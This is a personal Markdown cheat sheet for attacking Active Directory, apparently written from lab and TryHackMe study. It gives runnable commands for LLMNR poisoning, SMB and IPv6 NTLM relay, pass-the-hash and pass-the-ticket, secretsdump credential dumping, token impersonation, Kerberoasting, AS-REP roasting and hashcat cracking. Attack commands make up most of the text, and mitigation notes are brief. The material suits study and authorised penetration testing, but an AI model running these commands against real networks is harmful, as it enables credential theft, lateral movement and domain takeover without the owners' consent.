# Initial Attack Vector
### LLMNR Poisoning
 - Link Local Multicast Name Resolution.
 - Previously known as  NBT-NS.
 - Used to identify hosts when DNS fails.
 - Flaw here is, service responds with username and NTLM-v2 Hash when approiately responded to.
 - Attack process
    1. Victim tries to connec to `\\some_machine`, so it queries DNS server.
    2. If the server does not have, the victim does a broadcast.
    3. The attacker then replies to victim, yes i have `\\some_machine`, send me your hash, and I will connect you to it.
    4. Victim then sends its NTLM hash.
 - Needs lot of traffic, so run first thing. 
 - `sudo ./test/bin/python Responder.py -I vboxnet0 -rdwv`
 - `hashcat -m 5600 hash.txt rockyou.txt`

### SMB relay
 - Instead of cracking hash, just pass in the hash directly.
 - To find devices with smbsigning disabled `nmap --script=smb2-security-mode.nse -p445 <network>/24`.
 - Usually servers have smb signing enabled and required, but hosts will have smb signing enabled but not required.
 - Needs SMB signing to be disabled (SMB signing disabled means machine does not check where the hash came from), relayed creds must have admin priv on machine.
 - Turn off SMB and HTTP, we don't want to respond, listen on rsponder for hashes.
 - use ntlmrelayx `python ntlmrelayx -tf targets.txt -smb2support`. targets.txt will have IPs of victims.
 - For newer kali `impacket-ntlmrelayx -tf targets.txt -smb2support`
 - `-i` to get interactive smb shell, `-e meterpreter.exe`

### IPv6 attack
 - A system has IPv6 configured, DNS for it is usually not configured, an attacker claims itself to be DNS server for IPv6, and when victim queries it, it will get creds as well.
 - `mitm6 -d MARVEL.local` to listen
 - `ntlmrelayx.py -6 -t ldaps://<AD_IP> -wh fakewpad.ldap.local -l lootme`
 - Soln: disable IPv, ...
 - https://blog.fox-it.com/2018/01/11/mitm6-compromising-ipv4-networks-via-ipv6/ 
 - https://github.com/fortra/impacket/releases 
 
### Others
 - Nessus, nmap scan.
 - Look for websites within the scopes.
 - metasploit http_version module.
 - (Pass Back Attack) Printer stuffs https://www.mindpointgroup.com/blog/how-to-hack-through-a-pass-back-attack
 - Jenkins instances.
 - Thinking outside the box? 
 - Other open ports?

# Post Compromise Enumeration
 - https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
 - https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 - Execute ps1 script, it will be loaded, run commands.

### BloodHound
 - Bloodhound, helps us visualize AD data.
 - `sudo apt install bloodhound`.
 - It depends on neo4j, so set up console, `sudo neo4j console`, Connect to WEBUI, login `neo4j`, same user and password, change the password.
 - In terminal `bloodhound`.
 - On Windows machine, install consumer https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 - Run it `.\SharpHound.exe --collectionMethods All --domain Marvel.local --zipFileName file.zip`
 - Upload filze.ip to BloodHound.
 - Queries, Theres perbuilt query tab.

# Post Compromise Attacls
### Pass the hash attack/Pass the password attack
 - `crackmapexec smb <network>/24 -u username -d <domain_Name> -p <password>`
 - Or if u have hash from hashdump, take last bit of dump "...:hash:::" `crackmapexec smb <network>/24 -u username -H <hash> --local`
 - Use psexec.py to get shell access. `psexec.py <domain>/<user>:<password>@<ip>`
 - `secretsdump.py <domain>/<user>:<password>@<ip>`
 - Check if hash is same for Administrator and Username? 
 - NTLM hashes can be passed, NTLMv2 can not be passed.
 - If not on kali and other distro, snap has crackmapexec. `snap install crackmapexec`
 - Mitigations `Limit account reuse`, `Strong passwords`, `PAM (Privilige Access Management)`
 
### Token Impersonation
 - Tokens are keys that allow access to system/network.
 - `Delegate`: Created for logging into a machine or using Remote Desktop.
 - `Impersonate`: non interactive such as attaching a network drive or a domain logon script.
 - Token impersonation, is using token of another user, good for privilige escalation.
 - Following are steps in `meterpreter`
   - `load incognito`
   - `list_tokens -u`
   - `impersonate_token marvel\\fcastle` impersonating domain\\user 
   - If u wanna go back to old user `rev2self`.
 - Tip use exploit/windows/smb/psexec, set smb options, and test lab there.
 - Delegate token, user token must be logged in. Token exists until machine is rebooted.
 - Mitigations `Limit token creation permissions`, `Account teiring`, `Local admin rectriction (users not local admin)`

### Kerberoasting
 - Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD). In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos.
 - Actual steps that take place:
   - 1. Client sequests TGT by providing its NTLM hash.
   - 2. Server responds with TGT, encrypted, and KRBGT hash.
   - 3. Client requests TGS for a service, but provides its own TGT.
   - 4. Server responds with TGS for that service with service accounts HASH.
   - Tool to use for it. `GetUserSPNs.py MARVEL.local/fcastle:Password1 -dc-ip <IP> -request`.
   - Responds with maybe sql service hash, crack it. module is `13100`.
  
# Background
 - Windows domain is a group of users and computers under the administration of a given business
 - Active Directory acts as a catalogue that holds the information of all of the "objects" that exist on your network.
 - Users and Machine
 - GPOs are distributed to the network via a network share called SYSVOL, 
 -  it might take up to 2 hours for computers to catch up. 
 - force update GRP sync in local computer `gpupdate /force`
 - authentication method kerberos and netNTML
 - kerberos preferred, send username and password to kerberos server, and it returns ticket granting ticket, lookup process online if confused.
 - netNTLM from tryhackme https://tryhackme.com/room/winadbasics  
`The client sends an authentication request to the server they want to access.
The server generates a random number and sends it as a challenge to the client. The client combines their NTLM password hash with the challenge (and other known data) to generate a response to the challenge and sends it back to the server for verification. The server forwards the challenge and the response to the Domain Controller for verification. The domain controller uses the challenge to recalculate the response and compares it to the original response sent by the client. If they both match, the client is authenticated; otherwise, access is denied. The authentication result is sent back to the server. The server forwards the authentication result to the client.`
 - nmap scan, use kerbrute to get usernames? ```./kerbrute_linux_386 userenum usernames.txt --dc domain_controller```
 - ./kerbrute_linux_amd64  userenum userlist.txt -d spookysec.local --dc 10.10.107.161
 - ASREPRoasting. ASReproasting occurs when a user account has the privilege "Does not require Pre-Authentication" set. USe impacket tools ```python3.9 /opt/impacket/examples/GetNPUsers.py spookysec.local/svc-admin```. Might need to set dns config to map domain to IP. after the tool, u might get hash
 - Lookup hash in `https://hashcat.net/wiki/doku.php?id=example_hashes`
 - `hashcat -m 18200 -a 0 pass_hash.txt passwordlist.txt` pass_hash.txt must have the full, hashcat_wiki is a good resource
 - form there u can try different things
 - smbclient `smbclient -L \\\\10.10.107.161 -U spookysec.local/svc-admin`
 - `smbclient \\\\10.10.107.161\\backup -U spookysec.local/svc-admin` to connect to the shares.
 - From tryhackme notes :"Knowing this, we can use another tool within Impacket called "secretsdump.py". This will allow us to retrieve all of the password hashes that this user account (that is synced with the domain controller) has to offer" `python3.9 /opt/impacket/examples/secretsdump.py spookysec.local/backup@10.10.152.71`
 - Most of the replication related tasks are specified on the Directory Replication Service (DRS) Remote Protocol. The Microsoft API which implements such protocol is called DRSUAPI.
 - look at the format `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::` uid:rid:lmhash:nthash
 - pass the hash attack using `evil-winrm -u backup -H 19741bde08e135f4b40f1ca9aab45538 -i spookysec.local`
 - another tool https://github.com/GhostPack/Rubeus, need to launch in windows, listens for any kerberos tickets being passed in network `Rubeus.exe harvest /interval:30`
 - Kerberoasting is a post-exploitation attack technique that attempts to crack the password of a service account within the Active Directory (AD). In such an attack, an adversary masquerading as an account user with a service principal name (SPN) requests a ticket, which contains an encrypted password, or Kerberos.
 -  BloodHound to find all Kerberoastable accounts,
 - With rubeus `Rubeus.exe kerberoast` and u can try to crack the hash `hashcat -m 13100 -a 0 hash.txt Pass.txt`.
 - with impacket `sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.10.128.123 -request` and crack the hash
 - AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have pre-authentication disabled.
 - NOTE from tryhackme `During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are`
 - For AS-REP roasting, using rubeus, need to add  Insert 23$ after $krb5asrep$ so that the first line will be $krb5asrep$23$User. Make hash type `Kerberos 5, etype 23, AS-REP`
  - `hashcat -m 18200 hash.txt Pass.txt`
  - Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided
  - using mimikatz dump the ticket `sekurlsa::tickets /export` and then use the ticket `kerberos::ptt <ticket>` <ticket> = ticket file path
  - Check if a system is part of domain `systeminfo | findstr Domain`
 - https://github.com/ThePacketBender/notes/blob/master/hashcat.examples.txt
